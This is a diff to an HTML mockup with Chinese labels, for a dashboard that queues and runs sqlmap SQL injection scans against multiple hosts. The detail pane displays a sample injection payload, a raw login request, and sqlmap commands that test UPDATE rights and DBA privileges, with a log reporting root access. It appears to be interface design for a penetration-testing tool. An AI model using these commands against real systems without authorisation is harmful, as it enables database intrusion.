@@ -96,6 +96,53 @@
   .act-kill:hover { background: #8b2a2a44; }
   .act-na { color: #333; cursor: default; border-color: transparent; }
   .act-na:hover { background: transparent; }
+  .act-rerun { border-color: #238636; color: #3fb950; }
+  .act-rerun:hover { background: #23863622; }
+  .act-del { border-color: #5a1a1a; color: #f85149; }
+  .act-del:hover { background: #5a1a1a44; }
+
+  /* Search & batch toolbar */
+  .toolbar { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+  .search-box { flex: 1; position: relative; }
+  .search-box input { width: 100%; background: #161b22; border: 1px solid #30363d; color: #c9d1d9; padding: 8px 12px 8px 34px; border-radius: 6px; font-size: 13px; outline: none; }
+  .search-box input:focus { border-color: #58a6ff; }
+  .search-box::before { content: '⌕'; position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #555; font-size: 14px; }
+  .sort-select { background: #161b22; border: 1px solid #30363d; color: #c9d1d9; padding: 8px 12px; border-radius: 6px; font-size: 13px; outline: none; cursor: pointer; }
+  .sort-select:focus { border-color: #58a6ff; }
+
+  /* Batch bar */
+  .batch-bar { display: none; align-items: center; gap: 10px; padding: 10px 16px; background: #1f2937; border: 1px solid #1f6feb; border-radius: 8px; margin-bottom: 14px; }
+  .batch-bar.show { display: flex; }
+  .batch-bar .selected-count { color: #58a6ff; font-size: 13px; font-weight: 500; }
+  .batch-bar .batch-btn { background: transparent; border: 1px solid #30363d; color: #c9d1d9; padding: 6px 14px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+  .batch-bar .batch-btn:hover { background: #21262d; }
+  .batch-bar .batch-btn.danger { border-color: #8b2a2a; color: #f85149; }
+  .batch-bar .batch-btn.danger:hover { background: #8b2a2a44; }
+  .batch-bar .clear { margin-left: auto; color: #7d8590; cursor: pointer; font-size: 12px; }
+  .batch-bar .clear:hover { color: #fff; }
+
+  /* Checkbox */
+  .row-check { width: 16px; height: 16px; accent-color: #1f6feb; cursor: pointer; vertical-align: middle; }
+
+  /* Detail modal additions */
+  .modal-section { margin-bottom: 16px; }
+  .modal-section-title { font-size: 11px; color: #7d8590; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 8px; }
+  .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 12px; }
+  .info-item { font-size: 12px; }
+  .info-item .k { color: #7d8590; margin-bottom: 2px; }
+  .info-item .v { color: #c9d1d9; font-family: monospace; word-break: break-all; }
+  .payload-box { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px 12px; font-family: monospace; font-size: 11px; color: #3fb950; word-break: break-all; position: relative; }
+  .payload-box .copy-btn { position: absolute; top: 6px; right: 6px; background: #21262d; border: 1px solid #30363d; color: #7d8590; font-size: 10px; padding: 2px 8px; border-radius: 3px; cursor: pointer; }
+  .payload-box .copy-btn:hover { color: #fff; background: #30363d; }
+  .cmd-box { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px 12px; font-family: monospace; font-size: 11px; color: #58a6ff; word-break: break-all; position: relative; }
+  .cmd-box .copy-btn { position: absolute; top: 6px; right: 6px; background: #21262d; border: 1px solid #30363d; color: #7d8590; font-size: 10px; padding: 2px 8px; border-radius: 3px; cursor: pointer; }
+
+  .modal-tabs { display: flex; gap: 0; border-bottom: 1px solid #21262d; margin-bottom: 14px; }
+  .modal-tab { padding: 8px 16px; cursor: pointer; font-size: 12px; color: #7d8590; border-bottom: 2px solid transparent; margin-bottom: -1px; }
+  .modal-tab:hover { color: #c9d1d9; }
+  .modal-tab.active { color: #58a6ff; border-bottom-color: #58a6ff; }
+  .modal-pane { display: none; }
+  .modal-pane.active { display: block; }
 
   /* Modal */
   .overlay { display: none; position: fixed; inset: 0; background: #00000088; z-index: 200; }
@@ -191,6 +238,28 @@
       </div>
     </div>
 
+    <!-- Search & Sort -->
+    <div class="toolbar">
+      <div class="search-box">
+        <input type="text" placeholder="搜索 Host 或 任务 ID...">
+      </div>
+      <select class="sort-select">
+        <option>排序：最新优先</option>
+        <option>排序：最早优先</option>
+        <option>排序：Host A→Z</option>
+        <option>排序：耗时最长</option>
+      </select>
+    </div>
+
+    <!-- Batch toolbar (visible when items selected) -->
+    <div class="batch-bar show">
+      <span class="selected-count">已选中 3 项</span>
+      <button class="batch-btn">↑ 批量插队</button>
+      <button class="batch-btn danger">■ 批量终止</button>
+      <button class="batch-btn danger">🗑 批量删除</button>
+      <span class="clear">取消选择</span>
+    </div>
+
     <!-- Filters -->
     <div class="filter-row">
       <button class="ftag active">全部 (12)</button>
@@ -212,6 +281,7 @@
       <table>
         <thead>
           <tr>
+            <th style="width:34px"><input type="checkbox" class="row-check"></th>
             <th style="width:60px">队列</th>
             <th>任务 ID</th>
             <th>Host</th>
@@ -219,12 +289,13 @@
             <th>UPDATE</th>
             <th>Root</th>
             <th>状态</th>
-            <th>时间</th>
-            <th style="width:140px">操作</th>
+            <th>耗时</th>
+            <th style="width:200px">操作</th>
           </tr>
         </thead>
         <tbody>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span class="tag tag-now">▶ NOW</span></td>
             <td class="td-id">c5d8e2b1</td>
             <td class="td-host">www.vuln-site.com</td>
@@ -232,10 +303,11 @@
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-running">运行中</span></td>
-            <td class="td-time">14:40:12</td>
-            <td><div class="row-actions"><button class="act-btn act-kill" onclick="event.stopPropagation();alert('终止任务 c5d8e2b1?')">■ 终止</button></div></td>
+            <td class="td-time">02:18</td>
+            <td><div class="row-actions"><button class="act-btn act-kill">■ 终止</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check" checked></td>
             <td><span class="tag tag-queue">#1</span></td>
             <td class="td-id">g8h2k4m9</td>
             <td class="td-host">admin.demo.io</td>
@@ -243,10 +315,11 @@
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-pending">⏱ 排队</span></td>
-            <td class="td-time">14:42:01</td>
-            <td><div class="row-actions"><button class="act-btn act-jump" onclick="event.stopPropagation();alert('插队到队首?')">↑ 插队</button></div></td>
+            <td class="td-time">—</td>
+            <td><div class="row-actions"><button class="act-btn act-jump">↑ 插队</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check" checked></td>
             <td><span class="tag tag-queue">#2</span></td>
             <td class="td-id">h3j7n5p2</td>
             <td class="td-host">portal.client-x.com</td>
@@ -254,10 +327,11 @@
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-pending">⏱ 排队</span></td>
-            <td class="td-time">14:43:18</td>
-            <td><div class="row-actions"><button class="act-btn act-jump" onclick="event.stopPropagation();alert('插队到队首?')">↑ 插队</button></div></td>
+            <td class="td-time">—</td>
+            <td><div class="row-actions"><button class="act-btn act-jump">↑ 插队</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check" checked></td>
             <td><span class="tag tag-queue">#3</span></td>
             <td class="td-id">k6m1q8r4</td>
             <td class="td-host">cms.target-2.net</td>
@@ -265,10 +339,11 @@
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-pending">⏱ 排队</span></td>
-            <td class="td-time">14:44:25</td>
-            <td><div class="row-actions"><button class="act-btn act-jump" onclick="event.stopPropagation();alert('插队到队首?')">↑ 插队</button></div></td>
+            <td class="td-time">—</td>
+            <td><div class="row-actions"><button class="act-btn act-jump">↑ 插队</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span class="tag tag-queue">#4</span></td>
             <td class="td-id">n2p9s5t7</td>
             <td class="td-host">forum.example.org</td>
@@ -276,10 +351,11 @@
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-na">— 待测</span></td>
             <td><span class="tag tag-pending">⏱ 排队</span></td>
-            <td class="td-time">14:45:50</td>
-            <td><div class="row-actions"><button class="act-btn act-jump" onclick="event.stopPropagation();alert('插队到队首?')">↑ 插队</button></div></td>
+            <td class="td-time">—</td>
+            <td><div class="row-actions"><button class="act-btn act-jump">↑ 插队</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr onclick="document.getElementById('detailModal').classList.add('show')">
+            <td onclick="event.stopPropagation()"><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">a3f2c1d8</td>
             <td class="td-host">shop.target.com</td>
@@ -287,10 +363,11 @@
             <td><span class="tag tag-ok">✓ 允许</span></td>
             <td><span class="tag tag-root">✓ Root</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">14:32:01</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">00:13</td>
+            <td onclick="event.stopPropagation()"><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">b9e1f4a2</td>
             <td class="td-host">api.target.com</td>
@@ -298,10 +375,11 @@
             <td><span class="tag tag-ok">✓ 允许</span></td>
             <td><span class="tag tag-na">— 否</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">13:55:44</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">00:42</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">u4v8w2x6</td>
             <td class="td-host">staging.app.io</td>
@@ -309,10 +387,11 @@
             <td><span class="tag tag-ok">✓ 允许</span></td>
             <td><span class="tag tag-na">— 否</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">13:38:22</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">01:05</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">e7a2b5c3</td>
             <td class="td-host">old.legacy-app.net</td>
@@ -320,10 +399,11 @@
             <td><span class="tag tag-ok">✓ 允许</span></td>
             <td><span class="tag tag-na">— 否</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">12:48:33</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">02:31</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">d1c3f9e4</td>
             <td class="td-host">login.demo.com</td>
@@ -331,10 +411,11 @@
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">13:20:08</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">03:18</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">f4e6d2a8</td>
             <td class="td-host">test.internal.corp</td>
@@ -342,10 +423,11 @@
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-ok">完成</span></td>
-            <td class="td-time">12:05:17</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">04:02</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
           <tr>
+            <td><input type="checkbox" class="row-check"></td>
             <td><span style="color:#444">—</span></td>
             <td class="td-id">y9z3a7b1</td>
             <td class="td-host">debug.broken-site.org</td>
@@ -353,8 +435,8 @@
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-na">— N/A</span></td>
             <td><span class="tag tag-killed">已终止</span></td>
-            <td class="td-time">11:42:55</td>
-            <td><div class="row-actions"><span class="act-btn act-na">—</span></div></td>
+            <td class="td-time">15:00</td>
+            <td><div class="row-actions"><button class="act-btn act-rerun">↻ 重跑</button><button class="act-btn act-del">🗑</button></div></td>
           </tr>
         </tbody>
       </table>
@@ -364,18 +446,102 @@
 
 <!-- Detail Modal -->
 <div class="overlay show" id="detailModal">
-  <div class="modal">
+  <div class="modal" style="width:780px">
     <div class="modal-head">
-      <h3>任务详情 — shop.target.com</h3>
-      <button class="modal-close" onclick="document.getElementById('detailModal').classList.remove('show')">✕</button>
+      <h3>任务详情 — shop.target.com <span style="color:#7d8590;font-weight:400;font-size:12px;margin-left:8px">a3f2c1d8</span></h3>
+      <div style="display:flex;gap:8px">
+        <button class="act-btn act-rerun">↻ 重跑</button>
+        <button class="act-btn act-del">🗑 删除</button>
+        <button class="modal-close" onclick="document.getElementById('detailModal').classList.remove('show')">✕</button>
+      </div>
     </div>
     <div class="modal-body">
       <div class="badge-row">
         <span class="tag tag-ok">注入 ✓</span>
         <span class="tag tag-ok">UPDATE ✓</span>
         <span class="tag tag-root">Root ✓</span>
+        <span class="tag tag-ok" style="background:#1c2129;color:#7d8590;border-color:#30363d">耗时 13s</span>
+        <span class="tag tag-ok" style="background:#1c2129;color:#7d8590;border-color:#30363d">2026-04-25 14:32:01</span>
       </div>
-      <div class="log-pre"><span class="info">        ___
+
+      <div class="modal-tabs">
+        <div class="modal-tab active" data-tab="result">结果</div>
+        <div class="modal-tab" data-tab="request">请求包</div>
+        <div class="modal-tab" data-tab="command">命令</div>
+        <div class="modal-tab" data-tab="log">完整日志</div>
+      </div>
+
+      <!-- Result tab -->
+      <div class="modal-pane active" data-pane="result">
+        <div class="modal-section">
+          <div class="modal-section-title">注入点信息</div>
+          <div class="info-grid">
+            <div class="info-item"><div class="k">参数名</div><div class="v">username</div></div>
+            <div class="info-item"><div class="k">请求方法</div><div class="v">POST</div></div>
+            <div class="info-item"><div class="k">注入类型</div><div class="v">boolean-based blind</div></div>
+            <div class="info-item"><div class="k">DBMS</div><div class="v">MySQL >= 5.0.12</div></div>
+            <div class="info-item"><div class="k">当前用户</div><div class="v">root@localhost</div></div>
+            <div class="info-item"><div class="k">DBA 权限</div><div class="v" style="color:#a371f7">True</div></div>
+          </div>
+        </div>
+        <div class="modal-section">
+          <div class="modal-section-title">Payload</div>
+          <div class="payload-box">
+            username=admin' AND 8888=8888-- &password=test123
+            <button class="copy-btn">复制</button>
+          </div>
+        </div>
+        <div class="modal-section">
+          <div class="modal-section-title">UPDATE 测试</div>
+          <div class="payload-box" style="color:#e3b341">
+            UPDATE information_schema.TABLES SET TABLE_COMMENT=TABLE_COMMENT WHERE 1=0
+            <button class="copy-btn">复制</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Request tab -->
+      <div class="modal-pane" data-pane="request">
+        <div class="modal-section">
+          <div class="modal-section-title">原始请求包（request.txt）</div>
+          <div class="payload-box" style="white-space:pre;color:#c9d1d9">POST /login HTTP/1.1
+Host: shop.target.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=abc123def456
+User-Agent: Mozilla/5.0
+
+username=admin*&password=test123<button class="copy-btn">复制</button></div>
+        </div>
+      </div>
+
+      <!-- Command tab -->
+      <div class="modal-pane" data-pane="command">
+        <div class="modal-section">
+          <div class="modal-section-title">注入检测命令</div>
+          <div class="cmd-box">
+            sqlmap -r /scans/a3f2c1d8/request.txt --batch --dbms=mysql --level=2 --risk=2 --output-dir=/scans/a3f2c1d8/output
+            <button class="copy-btn">复制</button>
+          </div>
+        </div>
+        <div class="modal-section">
+          <div class="modal-section-title">UPDATE 测试命令</div>
+          <div class="cmd-box">
+            sqlmap -r /scans/a3f2c1d8/request.txt --batch --dbms=mysql --sql-query="UPDATE information_schema.TABLES SET TABLE_COMMENT=TABLE_COMMENT WHERE 1=0"
+            <button class="copy-btn">复制</button>
+          </div>
+        </div>
+        <div class="modal-section">
+          <div class="modal-section-title">DBA 检测命令</div>
+          <div class="cmd-box">
+            sqlmap -r /scans/a3f2c1d8/request.txt --batch --dbms=mysql --is-dba
+            <button class="copy-btn">复制</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Log tab -->
+      <div class="modal-pane" data-pane="log">
+        <div class="log-pre"><span class="info">        ___
        __H__
  ___ ___[)]_____ ___ ___  {1.8.2#stable}</span>
 
@@ -385,7 +551,7 @@
 <span class="ok">[INFO] testing if the target URL content is stable</span>
 [INFO] testing 'AND boolean-based blind'
 [INFO] testing 'MySQL >= 5.1 AND error-based'
-<span class="ok">[INFO] GET parameter 'username' appears to be injectable</span>
+<span class="ok">[INFO] POST parameter 'username' appears to be injectable</span>
 <span class="ok">[INFO] sqlmap identified injection point(s):
 ---
 Parameter: username (POST)
@@ -397,6 +563,7 @@ Parameter: username (POST)
 [INFO] testing --is-dba...
 <span class="ok">[INFO] current user is DBA: True</span>
 <span class="warn">[*] ending @ 14:32:14</span></div>
+      </div>
     </div>
   </div>
 </div>
@@ -426,21 +593,69 @@ Parameter: username (POST)
             <option>1</option><option selected>2</option><option>3</option>
           </select>
         </div>
+        <div class="form-group" style="flex:1">
+          <label>超时时长（分钟）</label>
+          <select style="width:100%">
+            <option>5</option>
+            <option>10</option>
+            <option selected>15</option>
+            <option>30</option>
+            <option>60</option>
+            <option>不限制</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>备注（可选）</label>
+        <input type="text" placeholder="如：客户A 内网扫描" style="width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;padding:8px 10px;font-size:13px;outline:none">
       </div>
     </div>
     <div class="modal-foot">
       <button class="btn-cancel" onclick="document.getElementById('newScanModal').classList.remove('show')">取消</button>
-      <button class="btn-start">开始扫描</button>
+      <button class="btn-start">加入队列</button>
     </div>
   </div>
 </div>
 
 <script>
+// Filter tabs
 document.querySelectorAll('.ftag').forEach(btn => {
   btn.addEventListener('click', function() {
     document.querySelectorAll('.ftag').forEach(b => b.classList.remove('active'));
     this.classList.add('active');
   });
+});
+
+// Modal tabs
+document.querySelectorAll('.modal-tab').forEach(tab => {
+  tab.addEventListener('click', function() {
+    document.querySelectorAll('.modal-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.modal-pane').forEach(p => p.classList.remove('active'));
+    this.classList.add('active');
+    document.querySelector(`[data-pane="${this.dataset.tab}"]`).classList.add('active');
+  });
+});
+
+// Batch select bar visibility
+function updateBatchBar() {
+  const checked = document.querySelectorAll('tbody .row-check:checked').length;
+  const bar = document.querySelector('.batch-bar');
+  if (checked > 0) {
+    bar.classList.add('show');
+    bar.querySelector('.selected-count').textContent = `已选中 ${checked} 项`;
+  } else {
+    bar.classList.remove('show');
+  }
+}
+document.querySelectorAll('.row-check').forEach(c => c.addEventListener('change', updateBatchBar));
+document.querySelector('.batch-bar .clear')?.addEventListener('click', () => {
+  document.querySelectorAll('.row-check').forEach(c => c.checked = false);
+  updateBatchBar();
+});
+
+// Stop row click when clicking action buttons / checkboxes
+document.querySelectorAll('.act-btn, .row-check').forEach(el => {
+  el.addEventListener('click', e => e.stopPropagation());
 });
 </script>
 </body>
